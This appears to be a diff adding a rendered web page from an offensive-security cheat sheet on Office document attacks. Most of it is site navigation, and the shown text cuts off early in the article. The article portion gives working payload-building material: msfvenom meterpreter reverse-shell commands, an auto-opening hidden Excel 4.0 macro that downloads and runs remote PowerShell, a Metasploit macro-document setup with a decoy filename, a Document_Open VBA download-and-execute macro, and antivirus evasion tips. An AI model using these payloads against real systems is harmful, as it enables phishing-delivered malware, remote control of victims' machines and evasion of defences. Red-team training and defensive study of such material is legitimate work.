+          <span class="md-nav__icon md-icon"></span>
+          Upload Insecure Files
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/" class="md-nav__link">
+        Upload
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_2" type="checkbox" id="__nav_42_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_2">
+          CVE Ffmpeg HLS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CVE Ffmpeg HLS" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_2">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Ffmpeg HLS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
+        FFmpeg HLS vulnerability
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_3" type="checkbox" id="__nav_42_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_3">
+          Configuration Apache .htaccess
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Configuration Apache .htaccess" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_3">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Apache .htaccess
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
+        .htaccess upload
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_4" type="checkbox" id="__nav_42_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_4">
+          Configuration Busybox httpd.conf
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Configuration Busybox httpd.conf" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_4">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Busybox httpd.conf
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_5" type="checkbox" id="__nav_42_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_5">
+          Extension Flash
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Extension Flash" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_5">
+          <span class="md-nav__icon md-icon"></span>
+          Extension Flash
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_6" type="checkbox" id="__nav_42_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_6">
+          Picture Image Magik
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Picture Image Magik" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_6">
+          <span class="md-nav__icon md-icon"></span>
+          Picture Image Magik
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Picture%20Image%20Magik/" class="md-nav__link">
+        Image Tragik 1 & 2
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_7" type="checkbox" id="__nav_42_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_7">
+          Zip Slip
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Zip Slip" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_7">
+          <span class="md-nav__icon md-icon"></span>
+          Zip Slip
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
+        Zip Slip
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_43" type="checkbox" id="__nav_43" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_43">
+          Web Cache Deception
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Cache Deception" data-md-level="1">
+        <label class="md-nav__title" for="__nav_43">
+          <span class="md-nav__icon md-icon"></span>
+          Web Cache Deception
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Cache%20Deception/" class="md-nav__link">
+        Web Cache Deception Attack
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_44" type="checkbox" id="__nav_44" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_44">
+          Web Sockets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Sockets" data-md-level="1">
+        <label class="md-nav__title" for="__nav_44">
+          <span class="md-nav__icon md-icon"></span>
+          Web Sockets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Sockets/" class="md-nav__link">
+        Web Sockets Attacks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_45" type="checkbox" id="__nav_45" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_45">
+          XPATH Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XPATH Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_45">
+          <span class="md-nav__icon md-icon"></span>
+          XPATH Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XPATH%20Injection/" class="md-nav__link">
+        XPATH injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_46" type="checkbox" id="__nav_46" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_46">
+          XSLT Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XSLT Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_46">
+          <span class="md-nav__icon md-icon"></span>
+          XSLT Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSLT%20Injection/" class="md-nav__link">
+        XSLT Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_47" type="checkbox" id="__nav_47" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_47">
+          XSS Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XSS Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_47">
+          <span class="md-nav__icon md-icon"></span>
+          XSS Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/" class="md-nav__link">
+        Cross Site Scripting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
+        XSS in Angular and AngularJS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
+        XSS with Relative Path Overwrite - IE 8/9 and lower
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_48" type="checkbox" id="__nav_48" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48">
+          XXE Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XXE Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_48">
+          <span class="md-nav__icon md-icon"></span>
+          XXE Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XXE%20Injection/" class="md-nav__link">
+        XML External Entity
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_49" type="checkbox" id="__nav_49" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_49">
+           template vuln
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label=" template vuln" data-md-level="1">
+        <label class="md-nav__title" for="__nav_49">
+          <span class="md-nav__icon md-icon"></span>
+           template vuln
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../_template_vuln/" class="md-nav__link">
+        Vulnerability Title
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xlsm-hot-manchego" class="md-nav__link">
+    XLSM - Hot Manchego
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xlm-macrome" class="md-nav__link">
+    XLM - Macrome
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xlm-excel-40-sharpshooter" class="md-nav__link">
+    XLM Excel 4.0 - SharpShooter
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xlm-excel-40-excelntdonut" class="md-nav__link">
+    XLM Excel 4.0 - EXCELntDonut
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xlm-excel-40-exec" class="md-nav__link">
+    XLM Excel 4.0 - EXEC
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-metasploit" class="md-nav__link">
+    DOCM - Metasploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-download-and-execute" class="md-nav__link">
+    DOCM - Download and Execute
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-macro-creator" class="md-nav__link">
+    DOCM - Macro Creator
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-c-converted-to-office-vba-macro" class="md-nav__link">
+    DOCM - C# converted to Office VBA macro
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-vba-wscript" class="md-nav__link">
+    DOCM - VBA Wscript
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-vba-shell-execute-comment" class="md-nav__link">
+    DOCM - VBA Shell Execute Comment
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-vba-spawning-via-svchostexe-using-scheduled-task" class="md-nav__link">
+    DOCM - VBA Spawning via svchost.exe using Scheduled Task
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-wmi-com-functions" class="md-nav__link">
+    DOCM - WMI COM functions
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docmxlm-macro-pack-macro-and-dde" class="md-nav__link">
+    DOCM/XLM - Macro Pack - Macro and DDE
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-badassmacros" class="md-nav__link">
+    DOCM - BadAssMacros
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-cactustorch-vba-module" class="md-nav__link">
+    DOCM - CACTUSTORCH VBA Module
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-mmg-with-custom-dl-exec" class="md-nav__link">
+    DOCM - MMG with Custom DL + Exec
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docm-activex-based-inkpicture-control-painted-event-autorun-macro" class="md-nav__link">
+    DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vba-obfuscation" class="md-nav__link">
+    VBA Obfuscation
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vba-purging" class="md-nav__link">
+    VBA Purging
+  </a>
+  
+    <nav class="md-nav" aria-label="VBA Purging">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#officepurge" class="md-nav__link">
+    OfficePurge
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evilclippy" class="md-nav__link">
+    EvilClippy
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vba-offensive-security-template" class="md-nav__link">
+    VBA - Offensive Security Template
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vba-amsi" class="md-nav__link">
+    VBA - AMSI
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docx-template-injection" class="md-nav__link">
+    DOCX - Template Injection
+  </a>
+  
+    <nav class="md-nav" aria-label="DOCX - Template Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#remote-template" class="md-nav__link">
+    Remote Template
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#template-injections-tools" class="md-nav__link">
+    Template Injections Tools
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docx-dde" class="md-nav__link">
+    DOCX - DDE
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#slk-excel" class="md-nav__link">
+    SLK - Excel
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+  <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/edit/master/Methodology and Resources/Office - Attacks.md" title="Edit this page" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="office-attacks">Office - Attacks</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#xlsm---hot-manchego">XLSM - Hot Manchego</a></li>
+<li><a href="#xls---macrome">XLS - Macrome</a></li>
+<li><a href="#xlm-excel-40---sharpshooter">XLM Excel 4.0 - SharpShooter</a></li>
+<li><a href="#xlm-excel-40---excelntdonut">XLM Excel 4.0 - EXCELntDonut</a></li>
+<li><a href="#xlm-excel-40---exec">XLM Excel 4.0 - EXEC</a></li>
+<li><a href="#docm---metasploit">DOCM - Metasploit</a></li>
+<li><a href="#docm---download-and-execute">DOCM - Download and Execute</a></li>
+<li><a href="#docm---macro-creator">DOCM - Macro Creator</a></li>
+<li><a href="#docm---c-converted-to-office-vba-macro">DOCM - C# converted to Office VBA macro</a></li>
+<li><a href="#docm---vba-wscript">DOCM - VBA Wscript</a></li>
+<li><a href="#docm---vba-shell-execute-comment">DOCM - VBA Shell Execute Comment</a></li>
+<li><a href="#docm---vba-spawning-via-svchostexe-using-scheduled-task">DOCM - VBA Spawning via svchost.exe using Scheduled Task</a></li>
+<li><a href="#docm---wmi-com-functions">DCOM - WMI COM functions (VBA AMSI)</a></li>
+<li><a href="#docm---winmgmts">DOCM - winmgmts</a></li>
+<li><a href="#docmxlm---macro-pack---macro-and-dde">DOCM - Macro Pack - Macro and DDE</a></li>
+<li><a href="#docm---badassmacros">DOCM - BadAssMacros</a></li>
+<li><a href="#docm---cactustorch-vba-module">DOCM - CACTUSTORCH VBA Module</a></li>
+<li><a href="#docm---mmg-with-custom-dl--exec">DOCM - MMG with Custom DL + Exec</a></li>
+<li><a href="#vba-obfuscation">VBA Obfuscation</a></li>
+<li><a href="#vba-purging">VBA Purging</a><ul>
+<li><a href="#officepurge">OfficePurge</a></li>
+<li><a href="#evilclippy">EvilClippy</a></li>
+</ul>
+</li>
+<li><a href="#vba-amsi">VBA AMSI</a></li>
+<li><a href="#vba---offensive-security-template">VBA - Offensive Security Template</a></li>
+<li><a href="#docx---template-injection">DOCX - Template Injection</a></li>
+<li><a href="#docx---dde">DOCX - DDE</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<h2 id="xlsm-hot-manchego">XLSM - Hot Manchego</h2>
+<blockquote>
+<p>When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn't catch a simple lolbas payload to get a beacon on a target machine.</p>
+</blockquote>
+<ul>
+<li>https://github.com/FortyNorthSecurity/hot-manchego</li>
+</ul>
+<pre><code class="language-ps1">Generate CS Macro and save it to Windows as vba.txt
+PS&gt; New-Item blank.xlsm
+PS&gt; C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs
+PS&gt; .\hot-manchego.exe .\blank.xlsm .\vba.txt
+</code></pre>
+<h2 id="xlm-macrome">XLM - Macrome</h2>
+<blockquote>
+<p>XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.</p>
+</blockquote>
+<ul>
+<li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip</li>
+<li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip</li>
+<li>https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip</li>
+</ul>
+<pre><code class="language-ps1"># NOTE: The payload cannot contains NULL bytes.
+
+# Default calc
+msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread &gt; popcalc.bin
+msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread &gt; popcalc64.bin
+# Custom shellcode
+msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
+msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
+# MSF shellcode
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00'  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin
+
+dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin
+dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin
+
+# For VBA Macro
+Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop
+</code></pre>
+<p>When using Macrome build mode, the --password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of <strong>VelvetSweatshop</strong> is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.</p>
+<h2 id="xlm-excel-40-sharpshooter">XLM Excel 4.0 - SharpShooter</h2>
+<ul>
+<li>https://github.com/mdsecactivebreach/SharpShooter</li>
+</ul>
+<pre><code class="language-powershell"># Options
+-rawscfile &lt;path&gt;  Path to raw shellcode file for stageless payloads
+--scfile &lt;path&gt;    Path to shellcode file as CSharp byte array
+python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test
+
+# Creation of a VBA Macro
+# creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.
+SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
+
+# Creation of an Excel 4.0 SLK Macro Enabled Document
+~# /!\ The shellcode cannot contain null bytes
+msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\x00'
+SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee
+
+msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b '\x00'
+SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee
+</code></pre>
+<h2 id="xlm-excel-40-excelntdonut">XLM Excel 4.0 - EXCELntDonut</h2>
+<ul>
+<li>XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files.</li>
+<li>AMSI has no visibility into XLM macros (for now)</li>
+<li>Anti-virus struggles with XLM (for now)</li>
+<li>
+<p>XLM macros can access the Win32 API (virtualalloc, createthread, ...)</p>
+</li>
+<li>
+<p>Open an Excel Workbook.</p>
+</li>
+<li>Right click on "Sheet 1" and click "Insert...". Select "MS Excel 4.0 Macro".</li>
+<li>Open your EXCELntDonut output file in a text editor and copy everything.</li>
+<li>Paste the EXCELntDonut output text in Column A of your XLM Macro sheet.</li>
+<li>At this point, everything is in column A. To fix that, we'll use the "Text-to-Columns"/"Convert" tool under the "Data" tab.</li>
+<li>Highlight column A and open the "Text-to-Columns"  tool. Select "Delimited" and then "Semicolon" on the next screen. Select "Finished".</li>
+<li>Right-click on cell A1* and select "Run". This will execute your payload to make sure it works.</li>
+<li>To enable auto-execution, we need to rename cell A1<em> to "Auto_Open". You can do this by clicking into cell A1 and then clicking into the box that says "A1"</em> just above Column A. Change the text from "A1"* to "Auto_Open". Save the file and verify that auto-execution works.</li>
+</ul>
+<p>:warning: If you're using the obfuscate flag, after the Text-to-columns operation, your macros won't start in A1. Instead, they'll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let's say that cell is HJ1. If that's the case, then complete steps 6-7 substituting HJ1 for A1</p>
+<pre><code class="language-ps1">git clone https://github.com/FortyNorthSecurity/EXCELntDonut
+
+-f path to file containing your C# source code (exe or dll)
+-c ClassName where method that you want to call lives (dll)
+-m Method containing your executable payload (dll)
+-r References needed to compile your C# code (ex: -r 'System.Management')
+-o output filename
+--sandbox Perform basic sandbox checks. 
+--obfuscate Perform basic macro obfuscation. 
+
+# Fork
+git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\Users\User\Desktop\covenSource.cs 
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\Users\User\Desktop\covenSource.cs
+donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe
+donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe
+usage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate]
+python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin
+</code></pre>
+<p>XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md</p>
+<h2 id="xlm-excel-40-exec">XLM Excel 4.0 - EXEC</h2>
+<ol>
+<li>Right Click to the current sheet</li>
+<li>Insert a <strong>Macro IntL MS Excel 4.0</strong></li>
+<li>Add the <code>EXEC</code> macro
+    <code>powershell
+    =EXEC("poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')")
+    =halt()</code></li>
+<li>Rename cell to <strong>Auto_open</strong></li>
+<li>Hide your macro worksheet by a right mouse click on the sheet name <strong>Macro1</strong> and selecting <strong>Hide</strong></li>
+</ol>
+<h2 id="docm-metasploit">DOCM - Metasploit</h2>
+<pre><code class="language-ps1">use exploit/multi/fileformat/office_word_macro
+set payload windows/meterpreter/reverse_http
+set LHOST 10.10.10.10
+set LPORT 80
+set DisablePayloadHandler True
+set PrependMigrate True
+set FILENAME Financial2021.docm
+exploit -j
+</code></pre>
+<h2 id="docm-download-and-execute">DOCM - Download and Execute</h2>
+<blockquote>
+<p>Detected by Defender (AMSI)</p>
+</blockquote>
+<pre><code class="language-ps1">Sub Execute()
+Dim payload
+payload = &quot;powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.10.10.10:4242/exploit');&quot;
+Call Shell(payload, vbHide)
+End Sub
+Sub Document_Open()
+Execute
+End Sub
+</code></pre>
+<h2 id="docm-macro-creator">DOCM - Macro Creator</h2>
+<ul>
+<li>https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator</li>
+</ul>
+<pre><code class="language-ps1"># Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:
+C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
+# Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:
+C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
+# Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:
+C:\PS&gt; Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
+</code></pre>
+<h2 id="docm-c-converted-to-office-vba-macro">DOCM - C# converted to Office VBA macro</h2>
+<blockquote>
